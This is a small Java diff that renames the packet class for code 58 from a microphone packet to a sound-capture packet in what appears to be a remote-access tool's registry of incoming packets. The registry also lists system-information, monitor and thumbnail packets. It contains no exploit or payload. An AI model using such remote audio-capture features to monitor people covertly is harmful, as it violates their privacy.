@@ -69,7 +69,7 @@ public class IncomingPackets {
 		incomingPackets.put(/* "INSTPROG" */(byte) 55, Packet55InstalledProgram.class);
 		incomingPackets.put(/* "ADAPT" */(byte) 56, Packet56NetworkAdapter.class);
 		incomingPackets.put(/* "RAWINFO" */(byte) 57, Packet57RawComputerInfo.class);
-		incomingPackets.put(/* "SO" */(byte) 58, Packet58Microphone.class);
+		incomingPackets.put(/* "SO" */(byte) 58, Packet58SoundCapture.class);
 		incomingPackets.put(/* "IMGLIST" */(byte) 59, Packet59ThumbnailPreview.class);
 		incomingPackets.put(/* "ERROR" */(byte) 60, Packet60Error.class);
 		incomingPackets.put(/* "MONITOR" */(byte) 61, Packet61InitMonitors.class);
